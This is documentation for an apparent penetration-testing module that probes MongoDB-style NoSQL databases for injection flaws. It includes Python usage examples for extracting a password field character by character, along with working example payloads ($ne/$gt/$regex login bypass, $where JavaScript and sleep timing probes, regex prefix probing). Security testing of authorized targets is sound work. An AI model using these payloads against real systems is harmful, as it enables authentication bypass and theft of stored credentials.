# NoSQL Injection Module

## Overview

The NoSQL Injection module provides automated testing for NoSQL database vulnerabilities, specifically targeting MongoDB, CouchDB, Redis, and Cassandra. It implements multiple injection techniques including operator injection, authentication bypass, and blind data extraction.

## Features

### 1. Operator Injection Testing
- Tests for NoSQL operator injection using `$ne`, `$gt`, `$regex`, `$where`, and other operators
- Supports both JSON and query parameter injection
- Detects database errors and response anomalies

### 2. Authentication Bypass
- Tests for authentication bypass using NoSQL operators
- Detects successful login indicators
- Supports multiple bypass techniques

### 3. Boolean-Based Blind Injection
- Extracts data character by character using boolean conditions
- Uses regex patterns for character matching
- Provides progress tracking during extraction

### 4. Time-Based Blind Injection
- Detects vulnerabilities using time delays
- Adaptive baseline measurement for accurate detection
- Supports data extraction via timing analysis

### 5. JavaScript Injection
- Tests for JavaScript injection in `$where` clauses
- Detects JavaScript errors and execution
- MongoDB-specific exploitation

### 6. Automated Data Extraction
- Character-by-character data extraction
- Progress tracking with estimated time remaining
- Support for custom character sets
- Field length detection using binary search

## Usage

### Basic Testing

```python
from app.modules.nosql_injection import NoSQLInjectionTester, InjectionPoint
from app.core.request_handler import RequestHandler

# Initialize
request_handler = RequestHandler()
tester = NoSQLInjectionTester(request_handler)

# Define injection point
injection_point = InjectionPoint(
    parameter="username",
    location="json",
    original_value="admin",
    url="https://example.com/api/login",
    method="POST",
    is_json=True,
)

# Test for vulnerabilities
results = await tester.test_injection_point(injection_point)

for result in results:
    if result.is_vulnerable:
        print(f"Vulnerability found: {result.injection_type.value}")
        print(f"Confidence: {result.confidence}")
        print(f"Payload: {result.payload}")
```

### Authentication Bypass Testing

```python
# Test specifically for authentication bypass
from app.modules.nosql_injection import NoSQLInjectionType

results = await tester.test_injection_point(
    injection_point,
    techniques=[NoSQLInjectionType.AUTHENTICATION_BYPASS]
)
```

### Data Extraction

```python
from app.modules.nosql_injection import NoSQLDataExtractor

# Assuming we found a vulnerability
extractor = NoSQLDataExtractor(
    request_handler=request_handler,
    injection_point=injection_point,
    injection_result=vulnerable_result,
)

# Extract data with progress tracking
async def progress_callback(progress):
    print(f"Progress: {progress.progress_percentage:.1f}%")
    print(f"Extracted: {progress.current_value}")
    print(f"Estimated time remaining: {progress.estimated_time_remaining:.1f}s")

extracted_data, final_progress = await extractor.extract_data_boolean(
    field_name="password",
    max_length=50,
    progress_callback=progress_callback,
)

print(f"Final extracted data: {extracted_data}")
```

## Payload Categories

The module uses the following payload categories:

- `nosql_operator`: JSON operator injection payloads
- `nosql_string_operator`: String-based operator injection for query parameters
- `nosql_auth_bypass`: Authentication bypass payloads
- `nosql_js_injection`: JavaScript injection payloads for `$where` clauses
- `nosql_time_based`: Time-based blind injection payloads

## Supported Injection Locations

- `query`: URL query parameters
- `post`: POST form data
- `json`: JSON request body
- `header`: HTTP headers
- `cookie`: HTTP cookies

## Detection Techniques

### Error-Based Detection
- Detects NoSQL-specific error messages
- Identifies database type from error patterns
- High confidence when errors are found

### Response Difference Detection
- Compares response lengths and status codes
- Identifies anomalies in responses
- Verification through repeated requests

### Time-Based Detection
- Measures baseline response times
- Detects delays caused by sleep functions
- Statistical analysis for accuracy

### Boolean-Based Detection
- Tests true/false conditions
- Compares response differences
- Verifies consistency

## Requirements Validation

This module validates the following requirements:

- **Requirement 42.1**: Tests for operator injection using `$ne`, `$gt`, `$regex`, and `$where`
- **Requirement 42.2**: Implements authentication bypass through JSON injection and operator manipulation
- **Requirement 42.3**: Extracts data through boolean-based and time-based blind techniques
- **Requirement 42.4**: Tests for JavaScript execution in NoSQL queries
- **Requirement 42.5**: Provides automated data extraction with progress tracking

## Example Payloads

### Operator Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### JavaScript Injection
```json
{"$where": "1==1"}
{"$where": "this.password != null"}
{"$where": "sleep(5000)"}
```

### Boolean-Based Extraction
```json
{"username": {"$regex": "^a"}}  // Test if username starts with 'a'
{"username": {"$regex": "^ad"}} // Test if username starts with 'ad'
```

## Notes

- Always test against authorized targets only
- Some techniques may be noisy and trigger security alerts
- Time-based techniques are slower but more reliable for blind injection
- Progress tracking helps estimate completion time for long extractions
- Character set can be customized based on expected data format
